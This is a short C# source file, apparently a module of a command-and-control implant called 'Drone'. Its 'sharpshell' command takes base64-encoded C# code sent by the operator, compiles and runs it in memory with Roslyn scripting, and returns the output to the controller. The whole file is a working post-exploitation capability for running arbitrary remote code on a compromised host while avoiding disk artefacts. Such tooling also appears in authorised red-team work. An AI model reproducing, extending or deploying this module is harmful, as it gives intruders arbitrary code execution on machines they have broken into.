using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;

using Drone.Models;
using Drone.Modules;

using Microsoft.CodeAnalysis.CSharp.Scripting;

namespace Drone
{
    public class RoslynModule : DroneModule
    {
        public override string Name => "sharpshell";

        public override List<Command> Commands => new List<Command>
        {
            new("sharpshell", "Compile and execute C# code in memory", SharpShell, new List<Command.Argument>
            {
                new("/path/to/code.cs", false, true)
            })
        };

        private void SharpShell(DroneTask task, CancellationToken token)
        {
            var code = Encoding.UTF8.GetString(Convert.FromBase64String(task.Artefact));
            var result = (string) CSharpScript.EvaluateAsync(code, cancellationToken: token).GetAwaiter().GetResult();
            
            Drone.SendResult(task.TaskGuid, result);
        }
    }
}